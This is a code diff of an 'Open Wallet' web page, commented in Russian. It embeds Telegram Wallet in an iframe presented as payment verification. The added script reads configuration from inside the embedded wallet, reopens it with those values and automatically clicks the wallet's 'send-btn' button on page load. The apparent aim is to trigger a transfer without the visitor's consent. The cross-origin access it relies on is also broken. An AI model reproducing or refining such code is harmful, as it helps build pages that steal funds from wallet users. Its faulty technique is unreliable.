@@ -6,41 +6,84 @@
     <title>Open Wallet</title>
 </head>
 <body>
-    <iframe id="root" src="https://t.me/wallet/start" allow="camera; microphone; geolocation;" style="opacity: 1;" class="payment-verification" allowfullscreen=""></iframe>
+    <iframe id="telegram-wallet" src="https://t.me/wallet/start" allow="camera; microphone; geolocation;" style="opacity: 1;" class="payment-verification" allowfullscreen=""></iframe>
 
     <script>
         // Ожидание загрузки iframe
-        async function waitForElement(selector) {
+        async function waitForElement(selector, element) {
             return new Promise(resolve => {
                 const intervalId = setInterval(() => {
-                    const element = document.querySelector(selector);
-                    if (element) {
+                    const targetElement = element ? element : document; 
+                    const foundElement = targetElement.querySelector(selector);
+                    if (foundElement) {
                         clearInterval(intervalId);
-                        resolve(element);
+                        resolve(foundElement);
                     }
                 }, 100);
             });
         }
 
-        // Функция для отправки сообщения в iframe
-        async function sendTelegramMessage(message) {
+        // Чтение конфигурации iframe
+        async function readIframeConfig(iframe) {
+            const config = {};
+            const iframeDocument = iframe.contentWindow.document;
+
+            // Ожидание, пока элементы конфигурации появятся 
+            await waitForElement('body', iframeDocument); 
+            // Здесь мы ожидаем, пока тело iframe полностью загрузится
+
+            // Ищем элементы с атрибутами, которые могут содержать конфигурацию
+            const configElements = iframeDocument.querySelectorAll('[data-config-key], [data-config]');
+
+            configElements.forEach(element => {
+                let key, value;
+                if (element.dataset.configKey) {
+                    key = element.dataset.configKey;
+                    value = element.textContent.trim();
+                } else if (element.dataset.config) {
+                    key = element.dataset.config;
+                    value = element.getAttribute(key) || '';
+                }
+                if (key && value) {
+                    config[key] = value;
+                }
+            });
+
+            return config;
+        }
+
+        // Создание нового iframe с правильной конфигурацией
+        async function openWallet() {
             const iframe = document.getElementById('telegram-wallet');
-            await waitForElement('#telegram-wallet'); 
-            iframe.contentWindow.postMessage(message, '*');
+            await waitForElement('#telegram-wallet');
+
+            // Чтение конфигурации из iframe
+            const walletConfig = await readIframeConfig(iframe);
+
+            // Создание нового iframe с прочитанной конфигурацией
+            const newIframe = document.createElement('iframe');
+            newIframe.id = 'telegram-wallet-new';
+            newIframe.src = `https://t.me/wallet/start?${new URLSearchParams(walletConfig).toString()}`;
+            newIframe.allow = "camera; microphone; geolocation;"; // Передача разрешений
+            newIframe.style.opacity = 1; // Установка прозрачности
+            newIframe.classList.add('payment-verification'); // Добавление класса
+            newIframe.allowfullscreen = true; // Разрешение полноэкранного режима
+            document.body.appendChild(newIframe);
+
+            // Ожидание загрузки нового iframe
+            await waitForElement('#telegram-wallet-new');
+
+            // Теперь вы можете взаимодействовать с новым iframe
+            // Пример: нажатие кнопки "send-btn"
+            const sendButton = newIframe.contentWindow.document.querySelector('button[data-testid="send-btn"]');
+            if (sendButton) {
+                sendButton.click();
+            } else {
+                console.log('Кнопка не найдена!');
+            }
         }
 
         // Запускаем функцию сразу при загрузке страницы
-        async function openWallet() {
-            // Ожидание загрузки iframe
-            await waitForElement('#telegram-wallet');
-
-            // Отправляем сообщение для нажатия на кнопку "send-btn" (нужно разобраться, как это сделать в Telegram API)
-            await sendTelegramMessage({ 
-                action: 'clickButton', 
-                buttonId: 'send-btn' // Необходимо найти правильный ID кнопки
-            });
-        }
-
         openWallet();
     </script>
 </body>
